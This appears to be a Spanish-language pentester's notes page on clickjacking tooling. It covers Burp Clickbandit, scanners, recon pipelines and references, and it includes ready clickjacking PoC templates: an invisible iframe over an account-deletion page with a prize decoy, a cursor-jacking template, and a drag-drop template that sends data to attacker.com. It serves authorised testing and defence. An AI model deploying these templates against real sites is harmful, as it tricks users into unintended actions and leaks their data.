---
aliases:
  - Clickjacking Tooling
  - Clickbandit
  - Clickjacker
  - UI Redress Tooling
tags:
  - type/tool
  - vuln/clickjacking
  - technique/discovery
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Tool
linked:
  - '[[Clickjacking]]'
  - '[[Burp Suite]]'
  - '[[nuclei]]'
---
# Clickjacking - Tooling

***

## Burp Clickbandit

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp Pro menu → "Burp Clickbandit" → "Copy Clickbandit to clipboard" | Generate JS Clickbandit payload | Pro feature. |
| Browser DevTools console → paste Clickbandit payload + Enter | Inject Clickbandit into target page | Inject. |
| Clickbandit panel → "Start" → interact with target → "Finish" | Record real clicks for PoC | Record clicks. |
| Clickbandit panel → "Save" → download HTML PoC | Auto-generate standalone HTML PoC | Standalone PoC. |
| Open generated HTML local → verify framing + click | Test PoC | Validate. |
| Burp Proxy → HTTP history → filter `Response.matches("X-Frame-Options")` | Find responses con XFO | Filter. |
| Burp Match & Replace rule: strip `X-Frame-Options:` response header | Strip XFO for local testing | Defeat-test. |
| Burp Match & Replace rule: strip `Content-Security-Policy:` con frame-ancestors | Strip CSP for local testing | Defeat-test. |
| Burp Repeater → modify params → re-run Clickbandit | Iterative PoC | Iterative. |
| Burp BApp Store → "X-Frame-Options Detector" install | Auto detect XFO presence | Passive detect. |
| Burp Active Scan → "Clickjacking" check enabled | Active framing audit | Active scan. |
| Burp BCheck custom: `framing checker` | Pro v2023+ custom BCheck | Pro modern. |
^cj-tool-burp

### Workflow Clickbandit típico

```
1. Burp Pro → Burp Clickbandit → "Copy Clickbandit to clipboard"
2. Browser → navigate target → DevTools console (F12)
3. Paste payload → Enter
4. UI Clickbandit overlay → click "Start"
5. Interact with sensitive action
6. Click "Finish" → "Save" → HTML PoC downloads
7. Serve HTML from atacante server → repro chain
```

___

## PoC Generators y Templates

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/D4Vinci/Clickjacker && cd Clickjacker && python clickjacker.py -u https://target.com` | Clickjacker.py auto-PoC generator | CLI PoC gen. |
| `cat > poc.html <<'EOF'
<iframe src="https://victim.com/admin/delete" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.0001;z-index:9999"></iframe>
<div style="position:absolute;top:300px;left:200px;background:red;color:white;padding:20px">CLAIM PRIZE</div>
EOF` | Manual mínimo PoC inline | Manual baseline. |
| `cat > poc-sandbox.html <<'EOF'
<iframe src="https://victim.com/x" sandbox="allow-forms allow-same-origin" style="opacity:0.0001;..."></iframe>
EOF` | Sandbox bypass template | Sandbox bypass. |
| `cat > poc-drag.html <<'EOF'
<div ondragover="event.preventDefault()" ondrop="fetch('//attacker.com/?d='+event.dataTransfer.getData('text'))">Drop</div>
<iframe src="https://victim.com/profile" style="opacity:0.0001"></iframe>
EOF` | Drag-drop exfil template | Drag template. |
| `cat > poc-cursor.html <<'EOF'
<style>body{cursor:none}.f{position:fixed;width:24px;height:24px;background:url(c.png);pointer-events:none}</style>
<div class="f" id="c"></div><iframe src="//victim.com/x" style="opacity:0.0001"></iframe>
<script>onmousemove=e=>{c.style.left=(e.clientX+100)+'px';c.style.top=(e.clientY+100)+'px'}</script>
EOF` | Cursor-jacking template | Cursor template. |
| `python3 -m http.server 80 --bind 0.0.0.0` (serve PoC) | Quick HTTP server PoC host | PoC host. |
| `cloudflared tunnel --url http://localhost:80` (public expose) | Public expose PoC | Public test. |
| `zaproxy -cmd -port 8080 -quickurl https://target -quickprogress` (ZAP CJ alerts) | OWASP ZAP passive CJ scan | Free alt. |
| Burp BApp Store → "Clickjacker" install (community ext) | Burp clickjack PoC generator | BApp generator. |
| `git clone https://github.com/UI-Redressing/uiredressing.github.io && cd uiredressing && python3 -m http.server` | UI Redressing repo with templates | Templates repo. |
^cj-tool-generators

### Template manual mínimo

```html
<!DOCTYPE html>
<html>
<head>
<style>
  iframe {
    position:absolute; top:0; left:0;
    width:100%; height:100%;
    opacity:0.0001; z-index:2;
  }
  .decoy {
    position:absolute; top:300px; left:200px;
    z-index:1; padding:20px;
    background:#ff4444; color:#fff;
    font-size:24px; cursor:pointer;
  }
</style>
</head>
<body>
  <div class="decoy">¡GANASTE! Click para reclamar premio</div>
  <iframe src="https://victim.com/admin/delete-account"></iframe>
</body>
</html>
```

___

## Scanners y Bulk Recon

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nuclei -u https://target.com -t http/misconfiguration/clickjacking.yaml` | Nuclei CJ template scan | Auto detect. |
| `nuclei -l urls.txt -t http/misconfiguration/ -tags clickjacking -severity medium,high` | Bulk CJ scan multi-host | Bulk. |
| `curl -sI https://target.com/admin \| grep -iE 'x-frame-options\|content-security-policy.*frame-ancestors'` | CLI quick XFO/CSP check | Quick. |
| `for p in /admin /api/x /login /profile; do echo "[$p]"; curl -sI "https://target.com$p" \| grep -iE 'x-frame\|frame-ancestors'; done` | Per-path XFO/CSP bulk | Per-path. |
| `subfinder -d target.com -silent \| httpx -silent -mc 200 -title -web-server -tech-detect -path / \| while read line; do URL=$(echo "$line" \| awk '{print $1}'); H=$(curl -sI "$URL"); echo "$H" \| grep -qiE 'x-frame-options\|frame-ancestors' \|\| echo "[+] FRAMEABLE: $URL"; done` | Bulk subdomain + frameable filter | Bulk pipeline. |
| `whatweb -v https://target.com \| grep -i frame` | WhatWeb fingerprint headers | Fingerprint. |
| `httpx -l subs.txt -title -mc 200 -web-server -include-response -t 50 \| grep -B1 'frameable'` | httpx bulk header probe | Bulk httpx. |
| `git clone https://github.com/iangcarroll/clickjacker && go run clickjacker.go -u https://target.com -v` | Clickjacker Go CLI XFO/CSP audit | Go CLI. |
| `curl -s https://observatory.mozilla.org/api/v2/analyze?host=target.com \| jq` | Mozilla Observatory online grader | Online grader. |
| `python3 securityheaders.py -u https://target.com` (custom) | Custom Python headers scanner | DIY. |
| Burp Pro → Dashboard → "Site map" → right-click → "Engagement tools" → "Find scripts" filter "frame-busting" | Find frame-busting JS sources | Pro audit. |
^cj-tool-scanners

### Bulk recon pipeline

```bash
# Subdomain enum + headers + filter frameable
subfinder -d target.com -silent | \
  httpx -silent -mc 200 -title -web-server -tech-detect -path / | \
  while read line; do
    URL=$(echo "$line" | awk '{print $1}')
    HEADERS=$(curl -sI "$URL" 2>/dev/null)
    if ! echo "$HEADERS" | grep -qiE 'x-frame-options|frame-ancestors'; then
      echo "[+] FRAMEABLE: $URL"
    fi
  done

# Bulk nuclei
nuclei -l urls.txt -t http/misconfiguration/clickjacking/ -severity medium,high
```

___

## Browser DevTools y Frame Testing

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| DevTools Console: `document.body.appendChild(Object.assign(document.createElement('iframe'),{src:'https://target.com/admin',style:'width:500px;height:300px'}))` | Live frame test in console | Quick test. |
| DevTools Network tab → click row → "Response Headers" → check `X-Frame-Options` | Inspect XFO per request | Direct check. |
| DevTools Console: filter "Refused to frame" message | CSP block diagnostic | CSP blocking. |
| DevTools → Toggle Device Toolbar (Ctrl+Shift+M) → set mobile viewport | Touch emulation mobile | Mobile test. |
| DevTools → Settings → Preferences → "Disable JavaScript" checkbox → reload | Verify JS-only frame-busting | JS-off test. |
| DevTools → Application → Cookies → check SameSite attribute | Cookie SameSite inspect | SameSite. |
| DevTools → Application → Local/Session Storage → check tokens | Token inventory | Token check. |
| DevTools → Settings → ... → Permissions → camera/mic state | Permission state probe | WebRTC. |
| DevTools → Sources → search bundle `top != self\|top.location\|frame.busting` | Find frame-buster patterns | Code review. |
| `chrome --disable-web-security --user-data-dir=/tmp/chrome-cj` (no SOP) | Local Chrome no SOP debug | Local debug. |
| DevTools → Lighthouse → "Best Practices" → check frame-ancestors | Lighthouse audit | Auto audit. |
| DevTools → Performance → record clicks → analyze timing | Timing analysis touch | Performance. |
^cj-tool-devtools

___

## Wordlists y Repos

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/swisskyrepo/PayloadsAllTheThings && cat 'PayloadsAllTheThings/Clickjacking/README.md'` | PayloadsAllTheThings Clickjacking compendium | Foundation. |
| `git clone https://github.com/danielmiessler/SecLists && cat seclists/Fuzzing/clickjacking-payloads.txt 2>/dev/null` | SecLists CJ payloads | Foundation. |
| `wget https://book.hacktricks.xyz/pentesting-web/clickjacking.md` (en HTML) | HackTricks CJ guide | Reference. |
| `wget https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.md` | OWASP CJ Defense Cheat Sheet | Defense. |
| `gh search prs --owner hackerone "clickjacking" --state closed --limit 50` (or H1 directly) | Search disclosed H1 CJ reports | Real-world. |
| `git clone https://github.com/UI-Redressing/uiredressing.github.io` | UI Redressing templates repo | Templates. |
| `curl https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Clickjacking/Files/clickjack.html` | PayloadsAllTheThings sample PoC | Sample. |
| `pip install bugbounty-h1-stats && bugbounty-h1-stats search "clickjacking"` (custom) | H1 stats CJ search | Stats. |
| `grep -r "frame-ancestors\|X-Frame-Options" /etc/nginx/ /etc/apache2/ 2>/dev/null` | Local config grep defense | Defense audit. |
| `curl -s https://owasp.org/www-community/attacks/Clickjacking \| html2text` | OWASP page extract | Reference. |
| `git clone https://github.com/Bugcrowd/vulnerability-rating-taxonomy && grep -i clickjacking vrt.json` | Bugcrowd VRT severity | Scoring. |
| `curl -s https://portswigger.net/web-security/clickjacking` | PortSwigger labs reference | PortSwigger. |
^cj-tool-wordlists

***
